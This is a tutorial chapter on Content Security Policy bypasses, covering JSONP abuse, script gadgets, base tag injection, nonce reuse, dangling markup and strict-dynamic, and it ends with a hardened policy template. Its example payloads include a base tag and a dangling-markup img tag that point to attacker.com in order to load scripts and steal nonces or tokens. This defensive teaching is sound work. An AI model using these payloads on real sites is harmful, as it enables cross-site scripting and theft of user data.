# 04 — Content Security Policy Bypass

## Overview

CSP is the primary browser-level defense against XSS. However, common misconfigurations and browser behaviors allow bypasses even with a CSP present.

---

## CSP Audit Checklist

Before looking for bypasses, audit the policy for these misconfigurations:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' cdn.example.com;
```

| Directive | Issue | Risk |
|-----------|-------|------|
| `'unsafe-inline'` | Allows inline `<script>` and event handlers | Critical — CSP useless |
| `'unsafe-eval'` | Allows `eval()` and `Function()` | High |
| `*` wildcard | Any host can serve scripts | Critical |
| Missing `base-uri` | Base tag injection possible | High |
| Missing `object-src` | Plugin-based execution | Medium |
| Missing `require-trusted-types-for` | DOM sinks unprotected | Medium |

---

## Bypass Techniques

### 1. JSONP Endpoint Abuse

If a whitelisted domain exposes a JSONP endpoint, the callback parameter becomes arbitrary JS:

```
CSP: script-src https://apis.google.com
```

```html
<!-- If apis.google.com has /jsonp?callback=ANYTHING -->
<script src="https://apis.google.com/jsonp?callback=alert(1)//"></script>
```

**Finding JSONP endpoints:**
```bash
# Search for known JSONP endpoints on whitelisted domains
# Tools: JSONBee, CSP Evaluator
curl "https://TARGET_WHITELISTED/api?callback=test"
```

Known JSONP endpoints database: [JSONBee](https://github.com/zigoo0/JSONBee)

---

### 2. Script Gadgets

Whitelisted libraries often contain code patterns reusable for XSS without injecting new scripts:

#### Angular (< 1.6) Template Injection

```
CSP: script-src 'self' ajax.googleapis.com
```

```html
<!-- Inject Angular template expression -->
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.11/angular.min.js"></script>
```

#### jQuery `.html()` Gadget

```javascript
// If trusted code does:
$('#output').html(userControlledVar);
// And userControlledVar comes from an attacker-controlled source
```

---

### 3. Base Tag Injection

If `base-uri` is not set in CSP, injecting a `<base>` tag redirects all relative script loads:

```html
<!-- Inject this if base-uri is missing from CSP -->
<base href="https://attacker.com/">

<!-- Now all relative <script src="app.js"> loads from attacker.com -->
<script src="app.js"></script>
```

---

### 4. Nonce Reuse / Prediction

CSP nonces must be unique per response. Vulnerabilities arise when:

- Nonces are static or increment predictably
- Nonces are reflected in URLs or other observable locations
- Caching serves the same nonce to multiple users

```
CSP: script-src 'nonce-abc123'
```

```html
<!-- If nonce is leaked or predictable: -->
<script nonce="abc123">alert(1)</script>
```

---

### 5. Dangling Markup Injection

When XSS is blocked but HTML injection is possible, exfiltrate nonces or CSRF tokens:

```html
<!-- Inject unclosed attribute -->
<img src="https://attacker.com/steal?data=

<!-- Browser sends everything up to next quote to attacker -->
```

---

### 6. `strict-dynamic` Bypass via Trusted Script

If `strict-dynamic` is used, scripts loaded by a nonced script are also trusted:

```javascript
// If you can control a trusted script's behavior:
const s = document.createElement('script');
s.src = 'data:,alert(1)';
document.head.appendChild(s);  // Trusted because parent script is nonced
```

---

## Strong CSP Template

```
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{RANDOM_PER_REQUEST}' 'strict-dynamic';
  style-src 'nonce-{RANDOM_PER_REQUEST}';
  img-src 'self' data:;
  connect-src 'self';
  font-src 'self';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  object-src 'none';
  require-trusted-types-for 'script';
```

---

## Tools

- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) — Google's CSP analyzer
- [CSP Scanner](https://github.com/nicktacular/csp-scanner)
- [JSONBee](https://github.com/zigoo0/JSONBee) — JSONP endpoints database

---

## References

- [Bypassing CSP with Script Gadgets — Sebastian Lekies et al.](https://research.google/pubs/pub45542/)
- [PortSwigger CSP Bypass Research](https://portswigger.net/research/bypassing-csp-with-policy-injection)
